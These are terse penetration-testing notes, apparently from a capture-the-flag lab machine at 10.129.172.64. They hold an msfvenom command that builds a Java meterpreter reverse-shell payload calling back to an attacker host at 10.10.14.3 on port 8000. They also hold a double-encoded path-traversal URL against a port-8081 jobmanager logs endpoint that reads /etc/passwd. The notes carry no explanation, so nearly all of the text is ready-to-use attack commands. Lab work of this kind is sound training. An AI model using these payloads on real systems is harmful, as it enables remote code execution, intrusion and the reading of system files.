

10.129.172.64


```
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=8000 -f raw -o java.jar
```


Local File Inclusion

```
http://10.129.172.64:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

```